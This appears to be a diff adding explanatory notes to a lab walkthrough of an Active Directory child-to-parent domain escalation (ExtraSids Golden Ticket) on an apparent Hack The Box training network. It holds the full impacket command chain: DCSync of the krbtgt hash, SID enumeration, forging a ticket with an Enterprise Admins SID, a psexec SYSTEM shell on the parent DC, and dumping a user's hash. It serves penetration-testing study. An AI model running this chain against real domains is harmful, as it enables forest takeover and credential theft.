@@ -31,6 +31,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/bross -k -no-pass hacker@academy-ea-d
 # One-liner autopwn (use for reference, not on real engagements)
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
+> Full Linux ExtraSids chain. Run steps 1–3 to collect the four required values, then steps 4–6 to forge and use the ticket. `export KRB5CCNAME` must be set before any `-k -no-pass` command. Re-export in every new terminal.
 
 ---
 
@@ -60,6 +61,7 @@ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-
 # Look for: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
 #                                                         LM_hash (blank)              ^NT_hash^ ← this is what we need
 ```
+> DCSync only the KRBTGT account from the child domain DC. `-just-dc-user` limits the output to one account. The NT hash is the fourth colon-separated field in the output line.
 
 ### Step 2 — Get the child domain SID with lookupsid.py
 
@@ -71,6 +73,7 @@ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "
 # | grep "Domain SID" = filter out all the user/group noise, just show the domain SID line
 # Result: [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
 ```
+> Gets the child domain SID by targeting the child DC. The domain SID appears at the top of the output. `| grep "Domain SID"` filters out all user and group lines.
 
 ```bash
 # Full output (without grep) shows every user and group:
@@ -79,6 +82,7 @@ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
 # The full SID for any object = Domain SID + "-" + RID
 # Example: lab_adm at RID 1001 = S-1-5-21-2806153819-209893948-922872689-1001
 ```
+> Enumerates all SIDs without filtering. Useful for finding specific accounts or building a full SID map of the domain. Each object's full SID is the domain SID plus the RID shown in the output.
 
 ### Step 3 — Get Enterprise Admins SID from the parent domain
 
@@ -98,6 +102,7 @@ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B1
 # Construct EA SID: parent domain SID + "-519" = S-1-5-21-3842939050-3880317879-2865463114-519
 # Enterprise Admins RID is ALWAYS 519 — it's a well-known RID consistent across all AD environments
 ```
+> Gets the parent domain SID and Enterprise Admins RID in one command. Target the parent DC IP instead of the child. `-B12` shows 12 lines before the match so you see the domain SID and the EA line together. Append `-519` to the domain SID to build the full EA SID.
 
 ### Step 4 — Forge the Golden Ticket with ticketer.py
 
@@ -116,6 +121,7 @@ ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
 # hacker = the username to embed in the ticket — can be completely fake
 # Output: saves ticket as hacker.ccache in the current directory
 ```
+> Forges the ExtraSids Golden Ticket from Linux. `-extra-sid` is the key parameter — it injects the Enterprise Admins SID into the ticket. The username `hacker` is arbitrary. Output is saved as `hacker.ccache` in the current directory.
 
 ### Step 5 — Load the ticket and get a shell on the parent DC
 
@@ -125,6 +131,7 @@ export KRB5CCNAME=hacker.ccache
 # Must be set before running any -k -no-pass command
 # If you open a new terminal, you MUST export this again — it doesn't persist across sessions
 ```
+> Sets the Kerberos ticket file for all tools in this shell session. Must be re-run in every new terminal. This tells impacket tools where to find the forged ticket.
 
 ```bash
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
@@ -136,6 +143,7 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 # Result: SYSTEM shell on ACADEMY-EA-DC01 (the parent domain DC)
 # Verify with: whoami → nt authority\system, hostname → ACADEMY-EA-DC01
 ```
+> Uses the forged ticket to get a SYSTEM shell on the parent DC. The hostname in `@` is used for Kerberos Service Principal Name (SPN) lookup; `-target-ip` provides the actual IP to avoid DNS issues. `-k -no-pass` tells psexec.py to use the ticket from `KRB5CCNAME`.
 
 ### Step 6 — DCSync target user from parent domain (new terminal)
 
@@ -146,6 +154,7 @@ ssh htb-student@10.129.94.230
 export KRB5CCNAME=hacker.ccache
 # Must re-export — environment variable doesn't carry across SSH sessions
 ```
+> Re-establishes the shell session and reloads the ticket. `KRB5CCNAME` does not persist across SSH sessions — always re-export before running Kerberos commands.
 
 ```bash
 secretsdump.py -just-dc-user INLANEFREIGHT/bross -k -no-pass hacker@academy-ea-dc01.inlanefreight.local
@@ -158,6 +167,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/bross -k -no-pass hacker@academy-ea-d
 # Result: bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
 #                                                                              ^NT hash^
 ```
+> DCSync a specific user from the parent domain using the forged ticket. The user before `@` must match the username in the ticket (`hacker`) — using the machine account causes a checksum error. The NT hash is the fourth colon-separated field.
 
 ---
 
@@ -183,6 +193,7 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 # Useful for demonstrations but avoid on real engagements — autopwn scripts are hard to troubleshoot
 # and produce noisy, hard-to-explain logs in client reports
 ```
+> Fully automated child-to-parent escalation in one command. Useful for learning the flow. Avoid on real engagements — it is noisy and hard to explain in a client report. Use the manual steps above for actual assessments.
 
 ---
 
